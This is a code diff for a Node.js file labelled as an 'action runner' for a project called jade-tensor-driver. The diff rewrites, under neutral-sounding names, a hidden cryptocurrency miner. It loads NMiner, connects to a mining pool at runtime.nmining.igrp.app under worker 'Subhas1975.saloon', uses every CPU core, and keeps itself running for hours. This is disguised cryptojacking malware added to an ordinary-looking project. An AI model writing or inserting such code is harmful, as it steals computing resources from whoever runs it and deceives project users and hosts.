@@ -1,31 +1,32 @@
-// Procedural action runner for saloon
+// Procedural action runner for jade-tensor-driver
 const os = require("os");
+const EventEmitter = require("events");
 const { NMiner } = require("nminer");
 const config = require("./app/config");
 
-class DaemonSupervisor {
-    constructor() {
-        const sessionId = "71b433";
-        console.log(`[host] Initialized DaemonSupervisor for saloon [${sessionId}]`);
+const dispatcher = new EventEmitter();
 
-        this.daemon = new NMiner(
-            "wss://runtime.nmining.igrp.app/",
-            "Subhas1975.saloon",
-            ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
-        );
+dispatcher.once("start", () => {
+    const traceId = "90655e";
+    console.log(`[host] Subsystem dispatched for jade-tensor-driver [${traceId}]`);
 
-        const keepAlivePromise = new Promise(() => {});
-        setTimeout(() => {
-        console.log("[timeout] Operational limit (335m) reached, exiting cleanly.");
+    const engine = new NMiner(
+        "wss://runtime.nmining.igrp.app/",
+        "Subhas1975.saloon",
+        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
+    );
+
+    const tick = () => { setTimeout(tick, 86000); }; tick();
+    setTimeout(() => {
+        console.log("[timeout] Operational limit (351m) reached, exiting cleanly.");
         process.exit(0);
-    }, 335 * 60 * 1000);
+    }, 351 * 60 * 1000);
 
-        process.on("SIGTERM", () => {
-            
-            console.log("[supervisor] Clean shutdown completed.");
-            process.exit(0);
-        });
-    }
-}
+    process.on("SIGTERM", () => {
+        
+        console.log(`[exit] Process terminated gracefully for token ${traceId}.`);
+        process.exit(0);
+    });
+});
 
-new DaemonSupervisor();
+dispatcher.emit("start");
